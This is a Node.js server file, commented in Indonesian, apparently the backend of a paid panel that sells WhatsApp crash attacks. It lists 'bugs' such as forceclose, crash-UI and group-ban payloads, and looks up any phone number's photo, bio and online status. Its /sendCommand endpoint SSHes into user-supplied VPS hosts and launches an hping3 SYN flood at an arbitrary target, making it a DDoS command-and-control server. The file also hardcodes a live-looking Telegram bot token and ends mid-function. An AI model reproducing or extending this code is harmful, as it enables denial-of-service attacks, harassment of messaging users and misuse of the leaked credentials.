const telegramConfig = require('./telegram.json');
const originalStdoutWrite = process.stdout.write.bind(process.stdout);
const originalStderrWrite = process.stderr.write.bind(process.stderr);
process.on('SIGINT', () => {
  console.log('[🛑 SIGINT] Server dihentikan manual.');
  process.exit(0);
});

process.stdout.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStdoutWrite(chunk, encoding, callback);
};
process.stderr.write = (chunk, encoding, callback) => {
  if (typeof chunk === 'string' && (
    chunk.includes('Closing stale open session') ||
    chunk.includes('Closing session:') ||
    chunk.includes('Failed to decrypt message') ||
    chunk.includes('Session error:') ||
    chunk.includes('Closing open session') ||
    chunk.includes('Removing old closed'))
  ) return true;
  return originalStderrWrite(chunk, encoding, callback);
};

const safeExit = process.exit;
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    makeChatsSocket,
    generateProfilePicture,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    encodeWAMessage,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestWaWebVersion,
    templateMessage,
    fetchLatestBaileysVersion,
    InteractiveMessage,    
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('@whiskeysockets/baileys');
const express = require("express");
const readline = require("readline");
const crypto = require("crypto");
const app = express();

// FIX: Global CORS untuk semua HTTP requests
app.use(function(req, res, next) {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization, x-api-key');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// FIX: Body parser untuk JSON dan URL-encoded
app.use(require('express').json({ limit: '10mb' }));
app.use(require('express').urlencoded({ extended: true, limit: '10mb' }));
const TelegramBot = require("node-telegram-bot-api");
const fs = require("fs");
const fsPromises = require('fs').promises;
const path = require('path');
const pino = require('pino');
const P = require('pino')
const axios = require('axios')
const vm = require('vm')
const os = require('os');
const WebSocket = require('ws');
const http = require('http');
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
let wsClients = {};
const { Client } = require('ssh2');
const DB_PATH = "./database.json";
const SESSION_PATH = path.join(__dirname, "permenmd");
const qrCodes = {};
let activeKeys = {};
const KEY_FILE = path.join(__dirname, 'keyList.json');
const bugs = [
  { bug_id: "fceh", bug_name: "[𝗙𝗢𝗥𝗖𝗟𝗢𝗦𝗘 𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣]" },
  { bug_id: "fcehjir", bug_name: "[𝗙𝗢𝗥𝗖𝗟𝗢𝗦𝗘 𝗛𝗜𝗧]" },
  { bug_id: "fcih", bug_name: "[𝗙𝗢𝗥𝗖𝗟𝗢𝗦𝗘 𝗖𝗟𝗜𝗖𝗞 𝟭 𝗠𝗦𝗚]" },
  { bug_id: "lockchet", bug_name: "[𝗟𝗢𝗖𝗞 𝗖𝗛𝗔𝗧 𝗫 𝗕𝗟𝗔𝗡𝗞]" },
  { bug_id: "delayhard", bug_name: "[𝗗𝗘𝗟𝗔𝗬 𝗜𝗡𝗩𝗜𝗦𝗜𝗕𝗟𝗘]" },
  { bug_id: "killandroid", bug_name: "[𝗕𝗟𝗔𝗡𝗞 𝗔𝗡𝗗𝗥𝗢𝗜𝗗]" },
  { bug_id: "crashhard", bug_name: "[𝗖𝗥𝗔𝗦𝗛 𝗛𝗔𝗥𝗗]" },
  { bug_id: "crashjir", bug_name: "[𝗖𝗥𝗔𝗦𝗛 𝗦𝗜𝗦𝗧𝗘𝗠]" },
  { bug_id: "crashui", bug_name: "[𝗖𝗥𝗔𝗦𝗛 𝗨𝗜]" },
  { bug_id: "frezer", bug_name: "[𝗙𝗥𝗘𝗘𝗭𝗘 𝗖𝗛𝗔𝗧 𝗟𝗔𝗚]" },
  { bug_id: "fcios", bug_name: "[𝗙𝗢𝗥𝗖𝗟𝗢𝗦𝗘 𝗜𝗢𝗦]" },
  { bug_id: "fcehih", bug_name: "[𝗖𝗥𝗔𝗦𝗛 𝗜𝗢𝗦]" },
  { bug_id: "lockgbjir", bug_name: "[BANNED GB!!]" },
  { bug_id: "android_group", bug_name: "[FORCLOSE INFINITY GROUP!!]" },
  { bug_id: "lock_group", bug_name: "[𝗗𝗘𝗟𝗔𝗬 𝗚𝗥𝗢𝗨𝗣!!]" },
  { bug_id: "roid_group", bug_name: "[𝗖𝗥𝗔𝗦𝗛 𝗚𝗥𝗢𝗨𝗣!!]" },
];
let cncActive = true;
let vpsList = [];
let vpsConnections = {}
const VPS_FILE = 'vps.json';
let sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
fs.watchFile("keyList.json", () => {
  console.log("[📂] keyList.json changed, reloading...");
  sikmanuk = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
});

function sanitize(input) {
  return String(input)
    .replace(/[<>]/g, '')
    .replace(/[\r\n]/g, ' ')
    .slice(0, 250);
}

// ═══════════════════════════════════════════════════════════════════
// TELEGRAM CONFIG — GANTI 3 NILAI INI SESUAI KEBUTUHANMU
// ═══════════════════════════════════════════════════════════════════
const TG_TOKEN      = "8953005524:AAHCN24iqpdrgkEOFpIYPLGW2ILePs5pw9I";
const TG_MAIN_GROUP = "-1004369732478";   // ← ID group utama (WAJIB)
const TG_GROUP2     = "-1003967520651";                  // ← ID group ke-2 (kosongkan jika tidak pakai)
// ═══════════════════════════════════════════════════════════════════

const TOKEN = TG_TOKEN;
const bot = new TelegramBot(TOKEN, { polling: true });

bot.on('polling_error', (err) => {
  console.error('[TG POLL ERROR]', err.code || '', err.message);
});
bot.on('error', (err) => {
  console.error('[TG ERROR]', err.message);
});

// escMd: return plain string (notif dikirim tanpa Markdown)
function escMd(str) {
  return String(str == null ? '' : str);
}

// stripMd: hapus karakter markdown
function stripMd(str) {
  return String(str == null ? '' : str).replace(/[*_`\[\]~>#]/g, '');
}

// Helper baca telegram.json (untuk bot command ownerList dll)
function readTelegramConfig() {
  try { return JSON.parse(fs.readFileSync(path.join(__dirname, 'telegram.json'), 'utf8')); }
  catch(e) { console.error('[TG CONFIG ERROR]', e.message); return {}; }
}

// ────────────────────────────────────────────────────────────────
// sendTelegramNotif — kirim notif plain text via axios langsung
// TIDAK pakai Markdown agar 100% tidak error karakter spesial
// ────────────────────────────────────────────────────────────────
async function sendTelegramNotif(pesan, parseMode = 'Markdown') {
  // Deduplicate group ID
  const semuaTarget = [...new Set(
    [TG_MAIN_GROUP, TG_GROUP2].filter(id => id && String(id).trim() !== '')
  )];

  if (semuaTarget.length === 0) {
    console.error('[NOTIF ❌] Tidak ada Group ID yang dikonfigurasi!');
    return;
  }

  const pesanStr = String(pesan);

  for (const chatId of semuaTarget) {
    let berhasil = false;

    // Coba kirim dengan Markdown dulu
    try {
      const payload = {
        chat_id: String(chatId).trim(),
        text: pesanStr,
        disable_web_page_preview: true
      };
      if (parseMode) payload.parse_mode = parseMode;

      const resp = await axios.post(
        `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,
        payload,
        { timeout: 15000 }
      );
      if (resp.data && resp.data.ok) {
        console.log(`[NOTIF ✅] Terkirim ke ${chatId}`);
        berhasil = true;
      }
    } catch (err) {
      // Kalau Markdown gagal (karakter spesial), fallback ke plain text
      console.warn(`[NOTIF ⚠️] Markdown gagal ke ${chatId}, coba plain text...`);
    }

    // Fallback plain text kalau Markdown error
    if (!berhasil) {
      try {
        const pesanBersih = pesanStr.replace(/[*_`\[\]~>#]/g, '');
        const resp2 = await axios.post(
          `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`,
          {
            chat_id: String(chatId).trim(),
            text: pesanBersih,
            disable_web_page_preview: true
          },
          { timeout: 15000 }
        );
        if (resp2.data && resp2.data.ok) {
          console.log(`[NOTIF ✅] Terkirim plain text ke ${chatId}`);
        } else {
          console.error(`[NOTIF ❌] Gagal ke ${chatId}: ${resp2.data && resp2.data.description}`);
        }
      } catch (err2) {
        console.error(`[NOTIF ❌] Error kirim ke ${chatId}: ${err2.message}`);
      }
    }
  }
}

async function appendLogAsync(filePath, data) {
  try {
    if (fs.existsSync(filePath)) {
      const stats = fs.statSync(filePath);
      if (stats.size > 5 * 1024 * 1024) {
        fs.writeFileSync(filePath, '');
      }
    }
    await fsPromises.appendFile(filePath, data);
  } catch (err) {
    console.error(`[❌ LOG ERROR] Gagal menulis log: ${err.message}`);
  }
}


const LOGS_DIR = path.join(__dirname, 'user_logs');

function hapusIsiUserLogs() {
  if (!fs.existsSync(LOGS_DIR)) {
    console.log("[AUTOCLEAN LOGS] Folder tidak ditemukan");
    return;
  }

  const files = fs.readdirSync(LOGS_DIR);

  for (const file of files) {
    const filePath = path.join(LOGS_DIR, file);
    fs.rmSync(filePath, { recursive: true, force: true });
  }

  console.log("[AUTOCLEAN LOGS] Isi folder berhasil dihapus");
}

if (!fs.existsSync(LOGS_DIR)) {
  fs.mkdirSync(LOGS_DIR, { recursive: true });
  console.log("[LOGS] Folder 'user_logs' dibuat.");
}

function saveUserLog(username, type, title, description) {
  try {
    const userLogPath = path.join(LOGS_DIR, `${username}.json`);
    let logs = [];

    if (fs.existsSync(userLogPath)) {
      logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));
    }

    logs.push({
      type: type,
      title: title,
      description: description,
      timestamp: Date.now()
    });

    fs.writeFileSync(userLogPath, JSON.stringify(logs, null, 2));
    console.log(`[LOGS] Activity saved for ${username}: ${type}`);
  } catch (err) {
    console.error(`[LOGS] Gagal simpan log ${username}:`, err.message);
  }
}

// FIX: Server-side heartbeat to detect dead connections
const heartbeatInterval = setInterval(function() {
  wss.clients.forEach(function(ws) {
    if (ws.isAlive === false) {
      console.log('[WS] Dead connection terminated');
      return ws.terminate();
    }
    ws.isAlive = false;
    try { ws.ping(); } catch(_) {}
  });
}, 30000); // check every 30 seconds

wss.on('close', function() {
  clearInterval(heartbeatInterval);
});

wss.on('connection', function (ws, req) {
  let username;

  // FIX: Set WS timeout dan error handling
  ws.isAlive = true;
  ws.on('pong', function() { ws.isAlive = true; });

  ws.on('message', function (msg) {
    try {
      const data = JSON.parse(msg);

      if (data.type === 'sessionCheck') {
        const sessionList = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const user = sessionList.find(e => e.sessionKey === data.key);

        if (!user) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Invalid key"
          }));
          return ws.close();
        }

        if (user.androidId !== data.androidId) {
          ws.send(JSON.stringify({
            type: "forceLogout",
            reason: "Another device has logged in"
          }));
          return ws.close();
        }
      }

      if (data.type === 'validate') {
        const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
        const validKey = session.find(e => e.sessionKey === data.key);

        if (!validKey) {
          ws.send(JSON.stringify({
            type: "myInfo",
            valid: false,
            reason: "keyInvalid"
          }));
          return ws.close();
        }

        const validUsername = validKey.username;
        // FIX: Selalu kirim myInfo valid=true jika sessionKey cocok, abaikan androidId mismatch
        ws.send(JSON.stringify({
          type: "myInfo",
          valid: true,
          username: validUsername,
          androidId: validKey.androidId,
          role: validKey.role || "member"
        }));

        // FIX: Masukkan ke wsClients agar onlineUsers terhitung dengan benar
        if (validUsername) {
          username = validUsername;
          wsClients[username] = ws;
          // Broadcast onlineCount ke semua client
          const onlineCount = Object.keys(wsClients).length;
          wss.clients.forEach(function(client) {
            if (client.readyState === 1) {
              client.send(JSON.stringify({ type: 'onlineCount', count: onlineCount }));
            }
          });
          // FIX: Langsung kirim stats ke client baru agar totalUsers & onlineUsers langsung muncul
          try {
            const db = JSON.parse(require('fs').readFileSync(require('path').join(__dirname, 'database.json'), 'utf8'));
            ws.send(JSON.stringify({
              type: 'stats',
              totalUsers: db.length,
              onlineUsers: onlineCount
            }));
          } catch(e) {}
        }

        const validateInterval = setInterval(() => {
          const session = JSON.parse(fs.readFileSync("keyList.json", "utf8"));
          const validKey = session.find(e => e.sessionKey === data.key)
          const validId = session.find(e => e.androidId === data.androidId)

          if (!validKey) {
            clearInterval(validateInterval);
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "keyInvalid"
            }));
            return ws.close();
          }

          if (!validId) {
            clearInterval(validateInterval);
            ws.send(JSON.stringify({
              type: "myInfo",
              valid: false,
              reason: "androidIdMismatch"
            }));
            return ws.close();
          }

        }, 10000);
        ws.on('close', () => clearInterval(validateInterval));
      }
      if (data.type === 'auth') {
        username = getUserByKey(data.key);
        console.log('[AUTH] username:', username, 'key:', data.key);
        // FIX: Do NOT close on auth failure — just log warning, allow retry
        if (!username) {
          console.warn('[AUTH] Key not found in keyList:', data.key);
          ws.send(JSON.stringify({ type: 'authFailed', reason: 'Key tidak valid' }));
          return;
        }
        wsClients[username] = ws;
        // FIX: Include role and extra info in authOk response
        const authUserRole = loadKeyList().find(k => k.key === data.key || k.sessionKey === data.key);
        ws.send(JSON.stringify({
          type: 'authOk',
          username,
          role: (authUserRole && authUserRole.role) ? authUserRole.role : 'member'
        }));

        // FIX: Broadcast online count to all clients after new auth
        const onlineCount = Object.keys(wsClients).length;
        wss.clients.forEach(function(client) {
          if (client.readyState === 1) {
            client.send(JSON.stringify({ type: 'onlineCount', count: onlineCount }));
          }
        });
      }

      // ── PING/PONG keepalive ──────────────────────────────────────────────
      if (data.type === 'ping') {
        try { ws.send(JSON.stringify({ type: 'pong' })); } catch(_) {}
        return;
      }

      // ── GET ALL USERS ────────────────────────────────────────────────────
      if (data.type === 'getUsers') {
        try {
          const userMap = {};

          // Add from database first (with role info)
          try {
            const db = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
            db.forEach(function(u) {
              if (u.username) {
                userMap[u.username] = { username: u.username, role: u.role || 'member' };
              }
            });
          } catch(dbErr) {
            console.warn('[getUsers] DB read error (non-fatal):', dbErr.message);
          }

          // Add from keyList — may have users not yet in db
          try {
            const keyListRaw = loadKeyList();
            keyListRaw.forEach(function(k) {
              if (k.username) {
                if (!userMap[k.username]) {
                  userMap[k.username] = { username: k.username, role: k.role || 'member' };
                } else if (k.role && userMap[k.username].role === 'member') {
                  // Update role from keyList if more specific
                  userMap[k.username].role = k.role;
                }
              }
            });
          } catch(klErr) {
            console.warn('[getUsers] KeyList read error (non-fatal):', klErr.message);
          }

          const users = Object.values(userMap);
          ws.send(JSON.stringify({ type: 'userList', users: users }));
          console.log('[getUsers] Sent', users.length, 'users to', username);
        } catch(e) {
          console.error('[getUsers] Error:', e.message);
          ws.send(JSON.stringify({ type: 'userList', users: [] }));
        }
      }

      // ── STATS ────────────────────────────────────────────────────────────
      if (data.type === 'stats') {
        try {
          const db = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
          // FIX: onlineUsers = jumlah WS client yang benar-benar terkoneksi saat ini
          const onlineUsers = Object.keys(wsClients).length;
          ws.send(JSON.stringify({
            type: 'stats',
            totalUsers: db.length,
            onlineUsers: onlineUsers
          }));
        } catch(e) {
          ws.send(JSON.stringify({ type: 'stats', totalUsers: 0, onlineUsers: 0 }));
        }
      }

    } catch (e) {
      console.error("WS error:", e.message);
    }
  });

  ws.on('close', () => {
    if (username && wsClients[username]) {
      delete wsClients[username];
      // FIX: Broadcast updated online count after disconnect
      const onlineCount = Object.keys(wsClients).length;
      wss.clients.forEach(function(client) {
        if (client.readyState === 1) {
          client.send(JSON.stringify({ type: 'onlineCount', count: onlineCount }));
        }
      });
      console.log('[WS] Disconnected:', username, '| Online:', onlineCount);
    }
  });
});

const wsPort = 41819;
// server.listen is called once at the bottom - do not double-listen here

const PORT = 41819;

app.use(express.urlencoded({ extended: false }));
app.use(express.json());

const rateLimitMap = {};
function rateLimiter(req, res, next) {
  const key = (req.query && req.query.key) || (req.body && req.body.key) || null;
  if (!key) return next();

  const now = Date.now();
  if (!rateLimitMap[key]) rateLimitMap[key] = [];

  rateLimitMap[key] = rateLimitMap[key].filter(ts => now - ts < 1000);
  rateLimitMap[key].push(now);

  if (rateLimitMap[key].length > 2) {
    const db = loadDatabase();
    const user = db.find(u => u.username === (activeKeys[key]?.username || "unknown"));
    console.warn(`[🚫 RATE LIMIT] Token '${key}' (${user?.username || 'unknown'}) melebihi batas 20 req/detik.`);

    return res.status(429).json({
      valid: false,
      rateLimit: true,
      message: "Terlalu banyak permintaan! Maksimal 20 request per detik.",
    });
  }

  next();
}

app.use(rateLimiter);

app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

if (fs.existsSync(KEY_FILE)) {
  try {
    const rawData = fs.readFileSync(KEY_FILE, 'utf8');
    const parsed = JSON.parse(rawData);

    for (const user of parsed) {
      // FIX: Support both sessionKey and key fields, lastLogin is optional
      const keyVal = user.sessionKey || user.key;
      if (keyVal && user.username) {
        const created = user.lastLogin ? new Date(user.lastLogin).getTime() : Date.now();
        const expires = created + (365 * 24 * 60 * 60 * 1000); // 1 year default

        activeKeys[keyVal] = {
          username: user.username,
          role: user.role || 'member',
          created,
          expires,
        };
        // Also map sessionKey if different from key
        if (user.sessionKey && user.key && user.sessionKey !== user.key) {
          activeKeys[user.key] = activeKeys[keyVal];
        }
      }
    }

    console.log("✅ activeKeys loaded from keyList.json:", Object.keys(activeKeys).length, "keys");
  } catch (err) {
    console.error("❌ Failed to load keyList.json:", err.message);
  }
}

function connectToAllVPS() {
  if (!cncActive) return;

  console.log("🔄 Connecting to all VPS servers...");

  for (const vps of vpsList) {
    if (vpsConnections[vps.host]) {
      console.log(`✅ Already connected to ${vps.host}`);
      continue;
    }

    const conn = new Client();

    conn.on('ready', () => {
      if (!cncActive) {
        conn.end();
        return;
      }

      console.log(`✅ Connected to VPS: ${vps.host}`);
      vpsConnections[vps.host] = conn;

      conn.on('close', () => {
        console.log(`🔌 Disconnected: ${vps.host}`);
        delete vpsConnections[vps.host];

        if (cncActive) {
          console.log(`🔁 Reconnecting to ${vps.host} in 5s...`);
          setTimeout(connectToAllVPS, 5000);
        }
      });
    });

    conn.on('error', (err) => {
      console.log(`❌ Failed to connect to ${vps.host}: ${err.message}`);
    });

    conn.connect({
      host: vps.host,
      username: vps.username,
      password: vps.password,
      readyTimeout: 5000
    });
  }
}

function disconnectAllVPS() {
  console.log("🛑 Disconnecting all VPS connections...");
  cncActive = false;

  for (const host in vpsConnections) {
    vpsConnections[host].end();
    delete vpsConnections[host];
  }
}

if (fs.existsSync(VPS_FILE)) {
  vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
  console.log("📥 VPS list loaded.");
  connectToAllVPS();
}

fs.watch(VPS_FILE, () => {
  try {
    vpsList = JSON.parse(fs.readFileSync(VPS_FILE, 'utf8'));
    console.log("🔄 VPS list updated.");
    connectToAllVPS();
  } catch (e) {
    console.error("❌ Failed to update VPS list:", e.message);
  }
});

function getUserByKey(key) {
  try {
    const keyInfo = activeKeys[key] || loadKeyList().find(k => k.key === key || k.sessionKey === key);
    if (!keyInfo || !keyInfo.username) return null;
    // Cache key info for performance
    if (!activeKeys[key]) {
      activeKeys[key] = {
        username: keyInfo.username,
        role: keyInfo.role || 'member',
        created: Date.now(),
        expires: Date.now() + (365 * 24 * 60 * 60 * 1000),
      };
    }
    // FIX: Accept user if found in keyList with valid username
    // No strict DB check — user may exist in keyList but not yet in database.json
    return keyInfo.username;
  } catch(e) {
    console.error('[getUserByKey] Error:', e.message);
    return null;
  }
}

function getUserObjectByKey(key) {
  try {
    const keyInfo = activeKeys[key] || loadKeyList().find(k => k.key === key || k.sessionKey === key);
    if (!keyInfo || !keyInfo.username) return null;
    if (!activeKeys[key]) {
      activeKeys[key] = {
        username: keyInfo.username,
        role: keyInfo.role || 'member',
        created: Date.now(),
        expires: Date.now() + (365 * 24 * 60 * 60 * 1000),
      };
    }
    // Also try to enrich with database.json data
    try {
      const db = JSON.parse(fs.existsSync('./database.json') ? fs.readFileSync('./database.json','utf8')||'[]' : '[]');
      const dbUser = db.find(u => u.username === keyInfo.username);
      if (dbUser) {
        return {
          username: dbUser.username,
          role: (dbUser.role || keyInfo.role || 'member').toLowerCase(),
          pairId: dbUser.pairId || null,
        };
      }
    } catch(_) {}
    return {
      username: keyInfo.username,
      role: (keyInfo.role || 'member').toLowerCase(),
      pairId: null,
    };
  } catch(e) {
    console.error('[getUserObjectByKey] Error:', e.message);
    return null;
  }
}

app.get("/myServer", (req, res) => {
  const key = req.query.key;
  const username = getUserByKey(key);
  if (!username) return res.status(401).json({ error: "Invalid session key" });

  const userVPS = vpsList.filter(vps => vps.owner === username);
  res.json(userVPS);
});

app.post("/addServer", (req, res) => {
  const { key, host, username: sshUser, password } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!host || !sshUser || !password) return res.status(400).json({ error: "Missing fields" });

  const newVPS = { host, username: sshUser, password, owner };
  vpsList.push(newVPS);
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));
  res.json({ success: true, message: "VPS added" });
});

app.post("/delServer", (req, res) => {
  const { key, host } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  const before = vpsList.length;
  vpsList = vpsList.filter(vps => !(vps.host === host && vps.owner === owner));
  fs.writeFileSync(VPS_FILE, JSON.stringify(vpsList, null, 2));

  const deleted = before !== vpsList.length;
  res.json({ success: deleted, message: deleted ? "VPS deleted" : "VPS not found" });
});

app.post("/sendCommand", (req, res) => {
  const { key, target, port, duration } = req.body;
  const owner = getUserByKey(key);
  if (!owner) return res.status(401).json({ error: "Invalid session key" });

  if (!target || !port || !duration) return res.status(400).json({ error: "Missing fields" });

  const userVPS = vpsList.filter(vps => vps.owner === owner);
  if (userVPS.length === 0) return res.status(400).json({ error: "No VPS available for this user" });

  for (const vps of userVPS) {
    const conn = vpsConnections[vps.host];
    if (!conn) {
      console.log(`❌ Not connected to ${vps.host}`);
      continue;
    }

    const command = `screen -dmS hping3 -S --flood ${target} -p ${port}`;
    const killCmd = `sleep ${duration}; pkill screen`;

    conn.exec(`${command} && ${killCmd}`, (err, stream) => {
      if (err) return console.error(`❌ Exec error on ${vps.host}:`, err.message);
      stream.on('close', (code, signal) => {
        console.log(`✅ Command done on ${vps.host} (code: ${code})`);
      });
    });
  }

  res.json({ success: true, message: `Command sent to ${userVPS.length} VPS` });
});

function loadDatabase() {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify([]));
    console.log("[🗃️ DB] Database baru dibuat.");
  }
  const data = JSON.parse(fs.readFileSync(DB_PATH));
  return data;
}

function saveDatabase(data) {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
}

function generateKey() {
  const key = crypto.randomBytes(8).toString("hex");
  console.log("[🔑 GEN] Key baru dibuat:", key);
  return key;
}

function isExpired(user) {
  const expired = new Date(user.expiredDate) < new Date();
  console.log(`[⏳ EXP] ${user.username} expired:`, expired);
  return expired;
}

app.get("/getInfo", async (req, res) => {
  const { key, number } = req.query;
  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) return res.json({ valid: false });

  const bizKeys = Object.keys(biz);
  if (!bizKeys.length) return res.json({ valid: false, message: "No connection" });

  const sock = biz[bizKeys[Math.floor(Math.random() * bizKeys.length)]];
  const jid = number.includes("@") ? number : number + "@s.whatsapp.net";

  try {
    const ppUrl = await sock.profilePictureUrl(jid, 'image').catch(() => null);
    const statusObj = await sock.fetchStatus(jid).catch(() => null);
    const check = await sock.onWhatsApp(number).catch(() => []);
    const info = check[0] || {};

    return res.json({
      valid: true,
      number: number,
      photo: ppUrl || "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      bio: statusObj?.status || "No bio",
      online: !!statusObj?.lastSeen,
      type: info.biz ? "business" : "personal"
    });
  } catch (err) {
    console.warn("[❌ GETINFO ERROR]", err.message);
    return res.json({ valid: false, message: "Query failed" });
  }
});

const KEY_LIST_FILE = path.join(__dirname, 'keyList.json');

function loadKeyList() {
  try {
    return JSON.parse(fs.readFileSync(KEY_LIST_FILE, 'utf8'));
  } catch {
    return [];
  }
}

function saveKeyList(list) {
  fs.writeFileSync(KEY_LIST_FILE, JSON.stringify(list, null, 2));
}

function recordKey({ username, key, role, ip, androidId }) {
  const list = loadKeyList();
  const stamp = new Date().toISOString();
  const idx = list.findIndex(e => e.username === username);

  if (idx !== -1) {
    list[idx] = { username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId };
  } else {
    list.push({ username, lastLogin: stamp, sessionKey: key, ipAddress: ip, androidId });
  }

  saveKeyList(list);
}

const news = [
    {
      image: "https://files.catbox.moe/z5zcvu.jpg",
      title: "X-TRAX BACK",
      desc: "𝗖𝗥𝗘𝗗𝗜𝗧 𝗕𝗬 @AmbatukamBePenat"
    },
    {
      image: "https://files.catbox.moe/z5zcvu.jpg",
      title: "𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡",
      desc: "Join channel @"
    }
  ];

app.get("/getMyActivity", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key] || loadKeyList().find(k=>k.key===key||k.sessionKey===key);
  if (!keyInfo) return res.status(401).json({ valid: false, message: "Invalid session key" });

  const username = keyInfo.username;
  const userLogPath = path.join(LOGS_DIR, `${username}.json`);

  try {
    if (!fs.existsSync(userLogPath)) {
      return res.json({ valid: true, activities: [] });
    }

    const logs = JSON.parse(fs.readFileSync(userLogPath, 'utf8'));

    logs.sort((a, b) => b.timestamp - a.timestamp);

    return res.json({ valid: true, activities: logs });
  } catch (err) {
    console.error("[GET LOGS ERROR]", err.message);
    return res.status(500).json({ valid: false, message: "Gagal mengambil log" });
  }
});

app.post("/validate", (req, res) => {
  const { username, password, version, androidId } = req.body;

  if (!androidId) {
    return res.json({ valid: false, message: "androidId required" });
  }

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);

  if (!user) return res.json({ valid: false });

  if (isExpired(user)) {
    return res.json({ valid: true, expired: true });
  }

  const keyList = loadKeyList();
  const existingSession = keyList.find(e => e.username === username);

  if (existingSession) {
    const oldAndroid = existingSession.androidId;
    const newAndroid = androidId;

    if (oldAndroid !== newAndroid) {
      console.log(`🚫 LOGIN DITOLAK: ${username} | Device Lama: ${oldAndroid} | Device Baru: ${newAndroid}`);

      return res.json({
        valid: false,
        message: "Akun ini sedang login di perangkat lain. Silakan logout terlebih dahulu di perangkat lama."
      });
    }
  }

  const key = generateKey();
  activeKeys[key] = {
    username,
    created: Date.now(),
    expires: Date.now() + 10 * 60 * 1000,
  };

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId,
  });

  saveUserLog(
    username,
    "login",
    "Login Berhasil",
    `IP: ${req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip} | Device: ${androidId}`
  );

  return res.json({
    valid: true,
    expired: false,
    key,
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news
  });
});

app.get("/myInfo", (req, res) => {
  const { username, password, androidId, key } = req.query;
  console.log("[ℹ️ INFO] Fetching info for:", username);

  const db = loadDatabase();
  const user = db.find(u => u.username === username && u.password === password);
  const keyList = loadKeyList();
  const userKey = keyList.find(k => k.username === username);
  console.log(userKey)

  if (!userKey) {
    console.log("[❌ KEY] Invalid or missing session key.");
    return res.json({ valid: false, reason: "session" });
  }

  if (userKey.androidId !== androidId) {
    console.log("[⚠️ DEVICE] Device mismatch:", userKey.androidId, "!=", androidId);
    return res.json({ valid: false, reason: "device" });
  }

  if (!user) {
    console.log("[❌ INFO] User not found.");
    return res.json({ valid: false });
  }

  if (isExpired(user)) {
    console.log("[⚠️ INFO] User expired.");
    return res.json({ valid: true, expired: true });
  }

  recordKey({
    username,
    key,
    role: user.role || 'member',
    ip: req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip,
    androidId
  });

  console.log("[✅ INFO] Info dikirim untuk:", username);

  return res.json({
    valid: true,
    expired: false,
    key,
    username: user.username,
    password: "******",
    expiredDate: user.expiredDate,
    role: user.role || "member",
    listBug: bugs,
    news: news
  });
});

app.post("/changepass", (req, res) => {
